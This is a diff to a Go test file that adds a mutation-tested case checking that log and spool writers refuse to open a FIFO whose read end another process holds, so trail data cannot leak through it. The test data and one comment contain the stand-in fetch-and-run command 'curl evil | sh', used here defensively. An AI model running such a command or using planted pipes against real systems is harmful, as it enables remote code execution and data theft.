@@ -13,7 +13,10 @@ package posse
 // openRefusalLeaf reds the symlink and dangling rows at every site; dropping
 // the nlink check reds every hardlink row; dropping O_NONBLOCK reds every
 // fifo row (by the timeout below); dropping the IsRegular check reds the
-// spool-read fifo row, the one site where the open itself succeeds. Dropping
+// spool-read fifo row and every row of the fifth plant — and before that
+// plant existed it red the spool-read row ALONE, so the arm was live on the
+// three WRITE sites and witnessed at none of them (ranger-base-q2peg; the
+// plant's own comment has the reading). Dropping
 // O_EXCL reds nothing, and that is expected: O_CREATE|O_NOFOLLOW over a
 // dangling link is already ELOOP, so O_EXCL is the second wall, kept because
 // it is PrepTouch's shape. A FIFO row that regresses would HANG rather than
@@ -71,6 +74,105 @@ func leafPlants() []leafPlant {
 			}
 			return "", ""
 		}},
+		// THE SHAPE THAT REACHES THE fstat ON A WRITE PATH, and the only one
+		// of the five that does (ranger-base-q2peg, verifying this bead).
+		// Each of the four above is refused UPSTREAM of the fstat wherever
+		// the open is for writing: symlink and dangling at O_NOFOLLOW
+		// (ELOOP), hardlink at the nlink count, and a bare fifo at ENXIO,
+		// because nothing holds its read end. So `IsRegular` was live on
+		// RefusalsLog, EnsureCageSpool and the fold's canonical append and
+		// witnessed at none of them — the mutant table reds it at the
+		// spool-READ row alone, which is the one site whose open succeeds.
+		//
+		// A planter is a process and can HOLD the read end. The write open
+		// then succeeds and the fstat is the only thing between the trail's
+		// lines — partly seat-authored, written verbatim — and a pipe the
+		// planter is reading. MEASURED 2026-11-21 (linux): with the arm
+		// narrowed to `flag == os.O_RDONLY && !fi.Mode().IsRegular()`, every
+		// other test in this file stayed GREEN while
+		// `session=s1 curl evil | sh` reached the planter's read end.
+		//
+		// GRADED per arm (MEASURED 2026-11-21, linux). That narrowing reds
+		// this plant at the three write sites and TestFoldWritesNothing...
+		// and nothing else; dropping IsRegular outright adds the spool-read
+		// row. The O_NOFOLLOW and nlink mutants leave every row of this
+		// plant GREEN, as they must — a FIFO is neither a link nor a shared
+		// inode, so this plant does not blur those arms. The one overlap is
+		// at the spool READ site, where dropping O_NONBLOCK reds this row
+		// too: a read open of a FIFO waits for a WRITER however many
+		// readers it has, so that site's two arms both reach it. The three
+		// write rows are the discriminating ones and they stay green there.
+		{"fifo whose read end a planter holds", func(t *testing.T, leaf string) (string, string) {
+			leafFifoWithAReader(t, leaf)
+			return "", ""
+		}},
+	}
+}
+
+// leafFifoWithAReader plants a FIFO and keeps its read end open for the rest
+// of the test, which is what makes a WRITE open of it succeed as far as the
+// fstat. The returned file is the planter's end: a caller that wants to
+// assert nothing was written through the plant reads it.
+func leafFifoWithAReader(t *testing.T, leaf string) *os.File {
+	t.Helper()
+	// The plants above are called with the leaf's directory already made;
+	// this one is also called directly, where the canonical log's gates dir
+	// may not exist yet and Mkfifo answers ENOENT for the parent rather
+	// than for anything about the plant.
+	if err := os.MkdirAll(filepath.Dir(leaf), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := syscall.Mkfifo(leaf, 0o644); err != nil {
+		t.Fatal(err)
+	}
+	rd, err := os.OpenFile(leaf, os.O_RDONLY|syscall.O_NONBLOCK, 0)
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { rd.Close() })
+	return rd
+}
+
+// leafReachedThePlanter is what arrived at the planter's read end, which is
+// "" when the refusal held. A deadline and not a blocking read: the point of
+// the assertion is that there is nothing there.
+func leafReachedThePlanter(t *testing.T, rd *os.File) string {
+	t.Helper()
+	if err := rd.SetReadDeadline(time.Now().Add(500 * time.Millisecond)); err != nil {
+		t.Fatal(err)
+	}
+	buf := make([]byte, 4096)
+	n, _ := rd.Read(buf)
+	if n <= 0 {
+		return ""
+	}
+	return string(buf[:n])
+}
+
+// The plant above asserts the REFUSAL at all four sites; this asserts the
+// thing a refusal is for, at the one site whose bytes are the seat's own.
+// foldedLines writes `session=<s> <seat bytes>` verbatim and by design, so a
+// canonical leaf the planter can read is a channel out of the trail — and
+// the fold is the only writer that carries bytes the seat chose.
+func TestFoldWritesNothingIntoAPlantersPipe(t *testing.T) {
+	t.Parallel()
+	a := cageApp(t)
+	if _, err := a.EnsureCageSpool("p", "s1"); err != nil {
+		t.Fatal(err)
+	}
+	leafWrite(t, a.CageSpoolPath("p", "s1"), "curl evil | sh\n")
+	leaf := a.RefusalsLogPath("p")
+	if err := os.Remove(leaf); err != nil && !os.IsNotExist(err) {
+		t.Fatal(err)
+	}
+	rd := leafFifoWithAReader(t, leaf)
+	err := leafCallWithin(t, leaf, func() error { return a.FoldRefusalsSpool("p", "s1") })
+	assertLeafRefused(t, err, "", "")
+	if got := leafReachedThePlanter(t, rd); got != "" {
+		t.Errorf("the fold wrote the trail into the planter's pipe: %q", got)
+	}
+	if _, serr := os.Stat(a.spoolCursorPath("p", "s1")); !os.IsNotExist(serr) {
+		t.Errorf("a refused append must not advance the cursor (stat: %v)", serr)
 	}
 }
 
